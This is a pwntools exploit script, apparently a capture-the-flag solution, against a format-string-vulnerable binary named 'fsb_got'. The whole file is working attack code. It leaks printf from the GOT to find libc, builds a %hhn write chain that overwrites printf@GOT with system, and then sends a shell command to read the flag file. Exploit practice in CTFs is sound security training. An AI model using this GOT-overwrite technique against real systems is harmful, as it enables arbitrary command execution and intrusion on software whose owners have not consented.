#!/usr/bin/env python3
from pwn import *
import time

context.binary = elf = ELF("./fsb_got", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

p = remote("<host-ip>", port)

# ---------- stage 1: leak printf@GOT ----------
p.recvuntil(b"say something: ")
p.sendline(b"%7$sAAAA" + p64(elf.got["printf"]))
printf_leak = u64(p.recvuntil(b"AAAA")[:-4].ljust(8, b"\x00"))

libc.address = printf_leak - libc.sym["printf"]
system_addr  = libc.sym["system"]            # absolute already, do NOT add libc.address

log.success(f"printf = {printf_leak:#x}")
log.success(f"libc   = {libc.address:#x}")
log.success(f"system = {system_addr:#x}")
assert (printf_leak >> 32) == (system_addr >> 32)

got = elf.got["printf"]

# ---------- stage 2: build %hhn chain ----------
changes = []                                 # (target_byte, offset) for differing bytes
for i in range(4):
    old = (printf_leak >> (8*i)) & 0xff
    new = (system_addr  >> (8*i)) & 0xff
    if old != new:
        changes.append((new, i))
changes.sort()                               # ascending so %c deltas stay positive
log.info(f"changes = {[(hex(v), o) for v, o in changes]}")

# iterate to find the argument indexes of the trailing address block
N = len(changes)
idx = list(range(11, 11 + N))                # initial guess
for _ in range(10):
    parts, prev = [], 0
    for (val, off), i in zip(changes, idx):
        parts.append(f"%{val-prev}c%{i}$hhn".encode())
        prev = val
    fmt = b"".join(parts)
    pad_len = (8 - len(fmt) % 8) % 8
    total = len(fmt) + pad_len
    nidx = list(range(6 + total // 8, 6 + total // 8 + N))
    if nidx == idx:
        break
    idx = nidx

parts, prev = [], 0
for (val, off), i in zip(changes, idx):
    parts.append(f"%{val-prev}c%{i}$hhn".encode())
    prev = val
fmt = b"".join(parts)
pad = b"A" * ((8 - len(fmt) % 8) % 8)
addresses = b"".join(p64(got + off) for _, off in changes)
payload2 = fmt + pad + addresses

log.info(f"payload2 ({len(payload2)}b) fmt = {fmt.decode()}")
assert len(payload2) < 0x100
assert b"\x00" not in fmt + pad

p.recvuntil(b"say something: ")
p.sendline(payload2)

# ---------- stage 3: printf@GOT == system, third call is system(line) ----------
p.recvuntil(b"say something: ")
p.sendline(b"cat flag.txt")

time.sleep(1)
print(p.recvrepeat(2).decode(errors="replace"))
p.close()
